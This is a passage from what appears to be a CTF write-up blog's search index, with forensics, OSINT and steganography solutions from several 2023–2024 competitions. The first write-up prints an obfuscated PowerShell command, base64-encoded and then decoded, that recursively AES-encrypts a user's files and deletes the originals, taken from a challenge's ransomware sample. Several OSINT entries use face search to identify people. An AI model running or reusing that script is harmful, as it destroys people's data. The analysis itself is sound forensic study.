4/29/2024 3:09 PM 20810 cat.jpg -a---- 4/30/2024 12:27 PM 169 todo_important.txt iex ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(\u0026#39;JGZvbGRlcj0nQzpcVXNlcnNcYm9iJzsgQWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uU2VjdXJpdHk7ICRwcm92aWRlciA9IE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5BZXNDcnlwdG9TZXJ2aWNlUHJvdmlkZXI7ICRwcm92aWRlci5LZXkgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCJfdzR5X2IzdHQzcl90aDRuIik7ICRwcm92aWRlci5JViA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoIjAzOTh5OXhsY3pzbXJmeTgiKTsgR2V0LUNoaWxkSXRlbSAkZm9sZGVyIC1GaWxlIC1SZWN1cnNlIHwgRm9yRWFjaC1PYmplY3QgeyAkaW5wdXQgPSBOZXctT2JqZWN0IElPLkZpbGVTdHJlYW0oJF8uRnVsbE5hbWUsIFtJTy5GaWxlTW9kZV06Ok9wZW4sIFtJTy5GaWxlQWNjZXNzXTo6UmVhZCk7ICRmaWxlbmFtZSA9ICIkKCRfLkZ1bGxOYW1lKS5lbmMiOyAkb3V0cHV0ID0gW1N5c3RlbS5JTy5GaWxlXTo6Q3JlYXRlKCRmaWxlbmFtZSk7ICRjcyA9IE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5DcnlwdG9TdHJlYW0oJG91dHB1dCwgJHByb3ZpZGVyLkNyZWF0ZUVuY3J5cHRvcigpLCBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5DcnlwdG9TdHJlYW1Nb2RlXTo6V3JpdGUpOyAkaW5wdXQuQ29weVRvKCRjcyk7ICRjcy5DbG9zZSgpOyAkb3V0cHV0LkNsb3NlKCk7ICRpbnB1dC5DbG9zZSgpOyBSZW1vdmUtSXRlbSAkX307ICRwcm92aWRlci5EaXNwb3NlKCk7\u0026#39;))) gci C:\\Users\\bob\\Desktop Directory: C:\\Users\\bob\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 4/30/2024 12:33 PM 20816 cat.jpg.enc -a---- 4/30/2024 12:33 PM 176 todo_important.txt.enc [Convert]::ToBase64String([IO.File]::ReadAllBytes((gci \u0026#34;${Env:USERPROFILE}\\Desktop\\todo_important.txt.enc\u0026#34;))) 1rlR6HY6oRjdSfnHgqBXsPmynKA+STdghcT3tvM1JqOACFb7C9tdd1lTrfr2xxmKe72f/I4TCUx9y2RftjCnCZcN6TwfGJaRwKxbvfp7x1zn7Im4mczMfT7n05gvfrPgZzLKyBQlMFou1FsDL2Xgc8etlub0DWu70Nztl4cncB3edgz/CHqv+YwjbElE3Z0yz7Ne0uf5Vb1SFkQZmVo9tVIzOPvS6MO+EIRMxKiPIHs= Ta có được đoạn đầu:\nflag_part BtSCTF{Sti11 Decode đoạn base64 trong iex:\n$folder=\u0026#39;C:\\Users\\bob\u0026#39;; Add-Type -AssemblyName System.Security; $provider = New-Object System.Security.Cryptography.AesCryptoServiceProvider; $provider.Key = [System.Text.Encoding]::UTF8.GetBytes(\u0026#34;_w4y_b3tt3r_th4n\u0026#34;); $provider.IV = [System.Text.Encoding]::UTF8.GetBytes(\u0026#34;0398y9xlczsmrfy8\u0026#34;); Get-ChildItem $folder -File -Recurse | ForEach-Object { $input = New-Object IO.FileStream($_.FullName, [IO.FileMode]::Open, [IO.FileAccess]::Read); $filename = \u0026#34;$($_.FullName).enc\u0026#34;; $output = [System.IO.File]::Create($filename); $cs = New-Object System.Security.Cryptography.CryptoStream($output, $provider.CreateEncryptor(), [System.Security.Cryptography.CryptoStreamMode]::Write); $input.CopyTo($cs); $cs.Close(); $output.Close(); $input.Close(); Remove-Item $_}; $provider.Dispose(); Ta có được part 2 là _w4y_b3tt3r_th4n. Giải mã AES lần nữa với plaintext nằm ở todo_important.txt.enc,ta có được part 3: _McAf33_:D_72844187}.\nFLAG: BtSCTF{Sti11_w4y_b3tt3r_th4n_McAf33_:D_72844187}\n","date":"25 June 2024","externalUrl":null,"permalink":"/posts/breakthesyntaxctf/","section":"Posts","summary":"\u003ch2 class=\"relative group\"\u003e1.For/freeflag \n    \u003cdiv id=\"1forfreeflag\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#1forfreeflag\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cp\u003e\n  \u003cfigure\u003e\n    \u003cimg class=\"my-0 rounded-md\" loading=\"lazy\" src=\"https://hackmd.io/_uploads/Hyhc8JsnA.png\" alt=\"Screenshot 2024-05-19 160417\" /\u003e\n    \n  \u003c/figure\u003e\n\u003c/p\u003e\n\u003cp\u003eThử thách cung cấp cho ta 1 file pcapng. Mình mở nó bằng Wireshark thì thấy có 1 luồng có thông tin như sau:\u003c/p\u003e","title":"Break the Syntax CTF","type":"posts"},{"content":" 1. Forensics/invoice # Challenge : Open file pdf,we can see: I use pdftotext to solve this. Just pdftotext invoice.pdf and we can read blacked out part. FLAG: CIT{Sir_Swaggy}\n2. Forensics/Beep Boop # Listening to the challenge file, a .wav file, I discovered it was morse code. Feeding it into the decoder, we get this string: INEVI63RENADIJSMFJJHKU3HKNVF4YJXHB4XOYL5. Use cyberchef, we get the flag : FLAG: CIT{q#@4\u0026amp;L*RuSgSj^a78ywa}\n3. Forensics/Sniff Sniff # Challenge gave me a pcap file. I was pretty confused with the multiple streams from the pcap file. I was about to give up but I saw so many people solving it. So I went back and looked at it again, scrolled to the bottom and tried to follow the last tcp stream. I saw the password part looked like base64, tried putting it into cyberchef, I got the right result. FLAG: CIT{iJ5B9s#lAp6iBNi6JtQ8}\n4.Osint/I\u0026rsquo;m as cold as a wise man # Challenge: Use GG lens, we can see some sites like this: Check again by GG maps: FLAG: CIT{coldfoot}\n5. Osint/Stalking 101 # Challenge: I was hanging around this challenge for a while, partly because I didn’t read the challenge properly. I tried searching all the social media platforms for the University of New Haven Chargers. I came up nothing, until I went to the university’s instagram, looked through the list of followers, and found him. Searching his insta name, we get account X. FLAG: CIT{@mossyblack818}\n6. Osint/Who even is that guy? # Challenge: From Amos\u0026rsquo;s insta, we can see person which Amos inspired:\nThe Osint challenge was the most frustrating one I have ever done. Hours spent in front of the computer, trying every angle in the photo but not a single clue about the person in the photo. I thought I would give up again. But no, I decided to try all the tools of the osintframework. And until I used Pimeyes, I was so overwhelmed, so happy that I jumped for joy. As we can see: With the blurred text, I immediately guessed that it was Satoshi - the person known as the creator of bitcoin.\nFLAG: CIT{satoshi}\n7. Osint/A conservative sandwich-heavy portfolio # Challenge: I had to wonder what the hell this challenge was. After digging through Amos\u0026rsquo; social media accounts, I suddenly remembered a picture I saw in the History section of a commit he made. I turned back to look at the picture, which I initially didn\u0026rsquo;t think would be relevant, and I smiled when I saw it.\nJust scan the qr code at the bottom of the book and you will get a link to the restaurant website. FLAG: CIT{Rubamba_restaurant}\n","date":"22 April 2024","externalUrl":null,"permalink":"/posts/cit@ctf/","section":"Posts","summary":"\u003ch2 class=\"relative group\"\u003e1. Forensics/invoice \n    \u003cdiv id=\"1-forensicsinvoice\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#1-forensicsinvoice\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eChallenge :\n\n  \u003cfigure\u003e\n    \u003cimg class=\"my-0 rounded-md\" loading=\"lazy\" src=\"https://live.staticflickr.com/65535/54179423817_805cdbb0d4_o.png\" alt=\"pic\" /\u003e\n    \n  \u003c/figure\u003e\n\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eOpen file pdf,we can see:\n\n  \u003cfigure\u003e\n    \u003cimg class=\"my-0 rounded-md\" loading=\"lazy\" src=\"https://live.staticflickr.com/65535/54180307111_66dec1503e_b.jpg\" alt=\"pic\" /\u003e\n    \n  \u003c/figure\u003e\n\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eI use \u003ccode\u003epdftotext\u003c/code\u003e to solve this. Just \u003ccode\u003epdftotext invoice.pdf\u003c/code\u003e and we can read blacked out part.\n\n  \u003cfigure\u003e\n    \u003cimg class=\"my-0 rounded-md\" loading=\"lazy\" src=\"https://live.staticflickr.com/65535/54180307091_23088dbe35_b.jpg\" alt=\"pic\" /\u003e\n    \n  \u003c/figure\u003e\n\u003c/p\u003e","title":"CTF@CIT","type":"posts"},{"content":"","date":"25 March 2024","externalUrl":null,"permalink":"/tags/osint/","section":"Tags","summary":"","title":"Osint","type":"tags"},{"content":"Cre image: warlock smurf\n1. Osint/Geo-Location # Challenge :\nPNG file:\nUsing GG image and focusing on the large building in the photo, we can see a number of matching images.\nI later identified it as the TCC Legacy Kincaid building. Check GG map and you will see it matches the image. It is located on Legacy Street,Texas.\nFLAG: texsaw{LEGACY_DRIVE}\n2. Forensics/The Forked Cave # Challenge:\nThe challenge gives us a git directory. Because I\u0026rsquo;ve done a similar challenge before, I used git log to check:\nAnd using command : git diff 02589c89210a9718a03992eec1a7da85e15c7c7d 9c6d7b5d77ba2f73fca83d026de1fe7904ce6e0b, we get the flag:\nFLAG: texsaw{git_g00d_or_git_d3ath}\n3. Forensics/PS2 games # Challenge :\nMy initial idea was to use code to filter out all games between 2000-2009, then check their platform-id. But after solving the challenge that way, I tried Workbench and it was much simpler. Just with the following SQL code:\nSELECT COUNT(DISTINCT Games.game_id) AS num_games FROM Games JOIN GamePlatforms ON Games.game_id = GamePlatforms.game_id JOIN Platforms ON GamePlatforms.platform_id = Platforms.platform_id WHERE Platforms.platform_name = \u0026#39;Playstation\u0026#39; AND YEAR(Games.release_date) BETWEEN 2000 AND 2009; FLAG: texsaw{42}\n4. Crypto/Freaky Flags # Challenge :\nPNG file:\nLuckily, I had just learned HTML and used Color Identity to determine the color of an image, so I immediately thought of trying it out. Each color will have 3 RGB values and I try to put them into ASCII decode. It works and I get the flag.\nFLAG: texsaw{the_flag_is_the_flag!}\n5. Osint/TrickyTree # A challenge that I initially thought I would give up on. But when there were about 5-6 hours left in the competition, I tried again. And this time thanks to the predecessors of the challenge, I have this link :\nBut guess what, of course it\u0026rsquo;s not that easy. I tried using a wayback machine but it didn\u0026rsquo;t work very well. Suddenly I thought of a website I used from the 0xL4ugh tournament, which is Archive.Today. I tried copying the link I just received and got the results:\nClick to see and we will see his father\u0026rsquo;s name. View profile and get date of birth.Thank all players who went first.\nFLAG: texsaw{09_02_1985}\n6. Forensics/Market Data # Challenge :\nI use the following SQL code to filter and get the correct results:\nSELECT SUM(revenue) AS total_revenue FROM ( SELECT od.game_id, SUM(od.quantity * od.subtotal) AS revenue, ROW_NUMBER() OVER (ORDER BY SUM(od.quantity * od.subtotal) DESC) AS revenue_rank FROM OrderDetails od JOIN Games g ON od.game_id = g.game_id JOIN Genres ge ON g.genre_id = ge.genre_id JOIN Orders o ON od.order_id = o.order_id WHERE ge.genre_name = \u0026#39;Action\u0026#39; -- Filter by Action genre AND YEAR(o.order_date) = 2023 -- Filter orders from 2023 GROUP BY od.game_id ) AS revenue_by_game WHERE revenue_rank = 5; -- Select the 5th ranked game\u0026#39;s revenue FLAG: texsaw{247.16}\n","date":"25 March 2024","externalUrl":null,"permalink":"/posts/texsawctf/","section":"Posts","summary":"\u003cp\u003eCre image: \u003ca href=\"https://warlocksmurf.github.io/$whoami/\" target=\"_blank\"\u003ewarlock smurf\u003c/a\u003e\u003c/p\u003e\n\n\n\u003ch2 class=\"relative group\"\u003e1. Osint/Geo-Location \n    \u003cdiv id=\"1-osintgeo-location\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#1-osintgeo-location\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eChallenge :\u003c/p\u003e\n\u003cp\u003e\n  \u003cfigure\u003e\n    \u003cimg class=\"my-0 rounded-md\" loading=\"lazy\" src=\"https://live.staticflickr.com/65535/54180858629_abe4565647_b.jpg\" alt=\"pic1\" /\u003e\n    \n  \u003c/figure\u003e\n\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003ePNG file:\u003c/p\u003e\n\u003cp\u003e\n  \u003cfigure\u003e\n    \u003cimg class=\"my-0 rounded-md\" loading=\"lazy\" src=\"https://live.staticflickr.com/65535/54181006255_ea9e258213_b.jpg\" alt=\"pic2\" /\u003e\n    \n  \u003c/figure\u003e\n\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eUsing GG image and focusing on the large building in the photo, we can see a number of matching images.\u003c/p\u003e","title":"Texsaw CTF","type":"posts"},{"content":" 1. Warmup/Flag Extraction # Challenge link Downloading the challenge, I get 1 rar file, then 1 string of tar files, I guess I extract 1 continuous sequence of file types. Use 7zip or whatever you can. At the end we get 1 gif file.\nTry strings \u0026ldquo;name-file.gif\u0026rdquo; | grep \u0026ldquo;INTIGRI\u0026rdquo;.\nFLAG: INTIGRITI{fl46_3x7r4c710n_c0mpl373}\n2. Warmup/Over the Wire 1 # Challenge Link\nI get 1 pcap file. People can have many ways but I use Wireshark. As always, I use tcp containing \u0026ldquo;flags\u0026rdquo; to check the flow of the file. I noticed 1 thread has info : RETR flag.zip.\nQuickly follow that stream and I see some important information.\nI was going to try File -\u0026gt; Export Objects, but there doesn\u0026rsquo;t seem to be anything in it. The only usable thing here is the password I found above. Then I tried : strings name-file.pcap | grep \u0026ldquo;flag\u0026rdquo; and getting 2 line seems to be a clue. The first is \u0026ldquo;flag.txt\u0026rdquo;. I used the binwalk with the pcap file and actually got 1 zip file. \u0026ldquo;Foremost\u0026rdquo; file pcap to receive the zip file, but it requires a key.I tried using the original password I found to open but failed. With the line \u0026ldquo;This flag is really important so I had to encrypt it in case it falls into the wrong hands\u0026rdquo; I reopen the wireshark and check which stream it belongs to. I got 1 message :\nI thought for a while and tried changing 2022 in the password to 2023 and got the flag.\nFLAG: INTIGRITI{1f_0nly_7h3r3_w45_4_53cur3_FTP}\n3. Warmup/Over the Wire 2 # Challenge Link\nAnother pcap challenge. I did the same as season 1 but got nothing. I tried again with File -\u0026gt; Export Objects. This time in the IMF section I see 4 .eml files. Try saving them all and viewing each file 1 (remember to save the file with the eml extension for easier reading). The first 2 files are nothing, just normal messages. 2 files after each file have 1 photo. I tried to download each photo and used the Stegano tools to see if I got anything. And in the 2nd image, I used the \u0026ldquo;binwalk\u0026rdquo; to check and saw that there was a zlib file . Using \u0026ldquo;zsteg\u0026rdquo; to check, we get the flag:\nFLAG: INTIGRITI{H1dd3n_Crypt0Cat_Purr}\n4. Misc/ZeChat # This was honestly one of the hardest challenges I\u0026rsquo;ve ever done. Only 7 teams solved this challenge, not including my team. I spent up to 8 hours solving this challenge by hand, including reading the article. You can read Chivato\u0026rsquo;s article to solve this problem. The binary string that I execute is:\n01001001 01001110 010101000 10010010 1000111 01010010 01001001 01010100 010010 0101111011 0111011100 1100110110 0011011010 0000110100 0011011101 0111110110 0100001101 0000110111 0011010001 0111110011 0011011011 1001 1000110011 0000011 001 0000110001 0110111000 1101100101 1111011001 1001110100 01 11011100 1000010010 0001001000 0101111101\nFLAG: INTIGRITI{w3ch47_d474_3nc0d1n6_ftw!!!}\n*Note: If you\u0026rsquo;re having trouble knowing where to start? And, I may have omitted some locations in the picture so my results may be a bit misleading. Please contact me if you encounter any of the above two situations or you have any other questions.\n","date":"30 November 2023","externalUrl":null,"permalink":"/posts/1337ctf/","section":"Posts","summary":"\u003ch2 class=\"relative group\"\u003e1. Warmup/Flag Extraction \n    \u003cdiv id=\"1-warmupflag-extraction\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#1-warmupflag-extraction\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ctf.intigriti.io/challenges#Over%20the%20Wire%20%28part%201%29-42\" target=\"_blank\"\u003eChallenge link\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\n  \u003cfigure\u003e\n    \u003cimg class=\"my-0 rounded-md\" loading=\"lazy\" src=\"https://live.staticflickr.com/65535/54179422262_fbf1126d07_o.png\" alt=\"Smile\" /\u003e\n    \n  \u003c/figure\u003e\n\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eDownloading the challenge, I get 1 rar file, then 1 string of tar files, I guess I extract 1 continuous sequence of file types. Use 7zip or whatever you can. At the end we get 1 gif file.\u003c/p\u003e","title":"1337CTF","type":"posts"},{"content":"","date":"30 November 2023","externalUrl":null,"permalink":"/tags/miscellanous/","section":"Tags","summary":"","title":"Miscellanous","type":"tags"},{"content":" 1.0x0 # Download and open the initial file, which is a regular image named \u0026ldquo;legit.png\u0026rdquo;.\nI tried using binwalk to check, and it seems there are some hidden files within it:\nAttempted to use binwalk and foremost to extract, but it seems unfeasible. I used zsteg:\nSpent quite some time here trying to find a way to extract that data. After a while, I found a way using the \u0026lsquo;dd\u0026rsquo; command. I used the following command to extract the data: dd if=legit.png bs=1 skip=$((0x96ef4)) of=out. Upon extraction, I noticed it was a PNG file. I removed the excess parts at the beginning, but it didn\u0026rsquo;t open correctly. Used: pngcheck -vv out.\nGot a 0x0 error. I searched for this error online and found a post by requroku / POCKekers, solving the CTF Killer Queen 2021. It seems the height and width of the image were changed to zero. Used the following Python code to find the correct height and width:\nfrom pwn import p32 from zlib import crc32 required_crc = 0x41305C20 max_dimension = 4000 for width in range(0, max_dimension): for height in range(0, max_dimension): ihdr = b\u0026#39;\\x49\\x48\\x44\\x52\u0026#39; + p32(width, endian=\u0026#39;big\u0026#39;) + p32(height, endian=\u0026#39;big\u0026#39;) + b\u0026#39;\\x08\\x06\\x00\\x00\\x00\u0026#39; if height % 100 == 0: print(\u0026#39;ihdr:\u0026#39;, ihdr.hex()) crc = crc32(ihdr) if crc == required_crc: print(\u0026#39;FOUND!\u0026#39;) print(width, height) exit() and we found:\nConvert the values to hex and fix:\nOpen the image again:\nFollowing the post mentioned earlier, I thought the next step was to use the stegsolve tool. Used it to check different color planes, and in the blue plane 1, we see:\nScanned the QR code and received the flag.\nFLAG: CHH{Im4g3_1n_1m@gE_1s_n1c3!!}\n","date":"15 November 2023","externalUrl":null,"permalink":"/posts/cookie-arena/","section":"Posts","summary":"\u003ch2 class=\"relative group\"\u003e1.0x0 \n    \u003cdiv id=\"10x0\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#10x0\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cp\u003eDownload and open the initial file, which is a regular image named \u0026ldquo;legit.png\u0026rdquo;.\u003c/p\u003e\n\u003cp\u003e\n  \u003cfigure\u003e\n    \u003cimg class=\"my-0 rounded-md\" loading=\"lazy\" src=\"https://live.staticflickr.com/65535/54180290521_9fe53d4613_c.jpg\" alt=\"pic1\" /\u003e\n    \n  \u003c/figure\u003e\n\nI tried using binwalk to check, and it seems there are some hidden files within it:\u003c/p\u003e","title":"Cookie Arena","type":"posts"},{"content":"","date":"15 November 2023","externalUrl":null,"permalink":"/tags/steganography/","section":"Tags","summary":"","title":"Steganography","type":"tags"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]